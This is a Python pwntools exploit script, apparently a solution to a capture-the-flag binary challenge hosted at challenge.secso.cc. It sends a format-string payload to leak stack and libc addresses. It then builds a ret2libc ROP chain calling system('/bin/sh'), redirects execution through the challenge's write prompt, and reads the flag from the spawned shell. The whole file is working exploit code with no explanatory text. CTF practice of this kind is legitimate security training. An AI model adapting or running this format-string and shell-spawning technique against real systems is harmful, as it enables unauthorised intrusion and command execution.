from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chal"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("challenge.secso.cc", 9003)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b"--%20$p--%21$p"

io.sendlineafter("Please state your name:\n", payload)

io.recvuntil("--")
leak = int(io.recv(14), 16)
hole_rbp_addr = leak - 0x120
log.success("ret.addr :-----> " + hex(hole_rbp_addr))

io.recvuntil("--")
leak = int(io.recv(14), 16)
libc.address = leak - 0x2a1ca
log.success("libc.address :-----> " + hex(libc.address))

ddebug("break *0x04011FB\n continue")
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
ret = next(libc.search(asm("ret")))

payload = p64(pop_rdi) + p64(binsh_addr)
payload += p64(system_addr)

io.sendlineafter("yourself:\n", payload)

io.sendlineafter("like to place your hole?", hex(hole_rbp_addr))
ch = 0xff & (hole_rbp_addr + 8)
payload = str(ch)
io.sendlineafter("What would you like to write there?", payload)

io.sendline(b"cat /flag")

io.interactive()
